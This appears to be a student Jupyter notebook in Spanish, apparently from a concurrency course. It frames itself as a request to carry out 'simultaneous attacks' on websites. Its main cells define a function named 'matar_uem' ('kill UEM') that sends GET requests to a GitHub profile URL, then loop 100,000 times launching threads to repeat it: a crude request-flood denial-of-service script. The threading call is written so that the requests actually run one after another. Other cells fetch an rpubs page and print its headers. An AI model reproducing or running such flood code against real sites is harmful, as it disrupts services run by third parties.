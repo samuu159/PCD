{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ced90b26-229e-4fd2-8f55-b9ed6e38e1e1",
   "metadata": {},
   "source": [
    "## Se solicita realizar ataques simultaneos a los siguientes sitios web:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "386a4e26-cb67-43e9-b6a4-4836cbc86c69",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os ,platform, requests, json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "2593ac2c-1dd6-4247-9f70-ebb66e8f74cd",
   "metadata": {},
   "outputs": [],
   "source": [
    "numero_de_veces_hasta_matar_uem = 100000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "08b73946-3c65-48c9-8bc7-1e90704f631f",
   "metadata": {},
   "outputs": [],
   "source": [
    "url_ = \"https://github.com/sukuzhanay\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2bd797be-0795-4dd3-8d7c-3fb233847a9f",
   "metadata": {},
   "source": [
    "## Http codigos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "bd59b2bb-e0c4-41a2-952a-8b9f0d89a186",
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython import display"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "dc679168-52d6-4c2d-8b6d-0d4a3727bfbb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "display.Image(\"Unknown.png\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "4e9554bf-ccb3-458c-b2d4-7dcef4ad1273",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_uem():\n",
    "    print(requests.get(url_))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2448bad0-245a-4091-8561-ccc482c722b1",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range (numero_de_veces_hasta_matar_uem):\n",
    "    threading.Thread(target=matar_uem()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "b35c4099-1c00-4686-b42b-d437f09093b7",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_=requests.get(\"https://rpubs.com/christian_sukuzhanay\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "3edc2ecc-d945-4e7b-9122-88c8a0871ade",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Thu, 06 Oct 2022 14:45:05 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Status': '200 OK', 'Cache-Control': 'max-age=0, private, must-revalidate', 'Referrer-Policy': 'strict-origin-when-cross-origin', 'X-Permitted-Cross-Domain-Policies': 'none', 'X-XSS-Protection': '1; mode=block', 'X-Request-Id': '7a3c1af3-769f-47c0-9a81-4f7efdb5e563', 'X-Download-Options': 'noopen', 'ETag': 'W/\"5c5ad6675a2696aca298a9d202e78d8b\"', 'X-Frame-Options': 'SAMEORIGIN', 'X-Runtime': '0.006146', 'X-Content-Type-Options': 'nosniff', 'X-Powered-By': 'Phusion Passenger 6.0.2', 'Server': 'nginx/1.14.0 + Phusion Passenger 6.0.2', 'Content-Encoding': 'gzip'}"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res_.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "e88e1d5f-06b9-4e08-a6c2-8cd4a148dbbe",
   "metadata": {},
   "outputs": [],
   "source": [
    "htm1=res_.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3588321d-9bb4-42eb-a780-286e66f97e7b",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "363f564c-20ea-4f52-840e-20ef66726d7d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
